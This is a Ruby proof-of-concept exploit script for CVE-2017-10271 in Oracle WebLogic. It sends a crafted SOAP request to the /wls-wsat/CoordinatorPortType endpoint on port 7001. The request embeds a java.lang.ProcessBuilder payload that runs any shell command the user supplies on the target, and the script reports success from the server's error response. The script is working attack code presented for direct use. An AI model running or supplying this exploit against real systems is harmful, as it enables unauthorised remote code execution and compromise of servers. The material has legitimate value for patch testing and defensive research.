#!/usr/bin/env ruby 
#Test against weblogic fmw_12.1.3.0.0_wls.jar

require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "touch /tmp/CVE-2017-10271.txt"

def usage
	puts "[*] #{$0} <host> [cmd]"
	exit
end

usage if ARGV.size < 1


sock = Rex::Proto::Http::Client.new(host, port = "7001", context = {}, ssl = false)

data = %Q|<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>/bin/sh</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>#{cmd}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
|

begin

req = sock.request_cgi(
	{
		'uri'   => "/wls-wsat/CoordinatorPortType",
		'version' => '1.0',
		'method' => 'POST',
		'ctype' => 'text/xml;charset=UTF-8',
		'data' => data,
	})

	puts "[*] Sending command '#{cmd}' ..."
	sock.send_request(req)
	data = sock.read_response()
	if data and data.body =~ /java\.lang\.ProcessBuilder cannot be cast to java\.lang\.String/
		puts "[*] Success!"
	else
		puts "[!] Command Failed"
	end
rescue => e
	puts "[!] #{e.to_s}"
	exit
end

